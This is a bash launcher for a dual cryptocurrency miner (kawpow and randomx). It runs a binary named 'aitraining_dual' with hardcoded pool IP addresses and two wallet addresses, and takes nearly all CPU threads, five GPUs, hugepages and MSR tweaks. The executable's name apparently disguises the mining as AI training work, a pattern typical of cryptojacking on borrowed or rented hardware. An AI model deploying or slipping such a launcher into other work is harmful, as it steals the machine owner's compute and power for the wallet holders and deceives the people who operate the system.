#!/bin/bash

WORKER="$HOSTNAME"

# Detect CPU threads and leave 2 free for the system
# We subtract 2 from the total number of logical processors.
CPU_THREADS=$(($(grep -c '^processor' /proc/cpuinfo) - 2))

# Ensure at least 1 CPU thread is used
if [ $CPU_THREADS -lt 1 ]; then 
    CPU_THREADS=1
fi

# Export GPU environment variables (optional for kawpow)
export GPU_MAX_HEAP_SIZE=100
export GPU_MAX_USE_SYNC_OBJECTS=1
export GPU_SINGLE_ALLOC_PERCENT=100
export GPU_MAX_ALLOC_PERCENT=100
export GPU_MAX_SINGLE_ALLOC_PERCENT=100
export GPU_ENABLE_LARGE_ALLOCATION=100
export GPU_MAX_WORKGROUP_SIZE=1024

# Export HW-AES optimization for RandomX (automatically used if supported)
export RANDOMX_USE_HW_AES=1

# Ensure the miner executable is set to be executable
chmod +x aitraining_dual

# Execute the dual mining command using 'exec' (like the working example)
# Note: 'exec' replaces the shell process with the miner process.
exec ./aitraining_dual \
    --algorithm "kawpow;randomx" \
    --pool "stratum+ssl://51.89.99.172:16161;stratum+ssl://51.222.200.133:10343" \
    --wallet "RM2ciYa3CRqyreRsf25omrB4e1S95waALr;44csiiazbiygE5Tg5c6HhcUY63z26a3Cj8p1EBMNA6DcEM6wDAGhFLtFJVUHPyvEohF4Z9PF3ZXunTtWbiTk9HyjLxYAUwd" \
    --worker "$WORKER;$WORKER" \
    --password "x;x" \
    --cpu-threads "0;$CPU_THREADS" \
    --randomx-hugepages 1 \
    --randomx-use-1gb-pages 1 \
    --force-msr-tweaks 1 \
    --keepalive true \
    --gpu-id 0,1,2,3,4
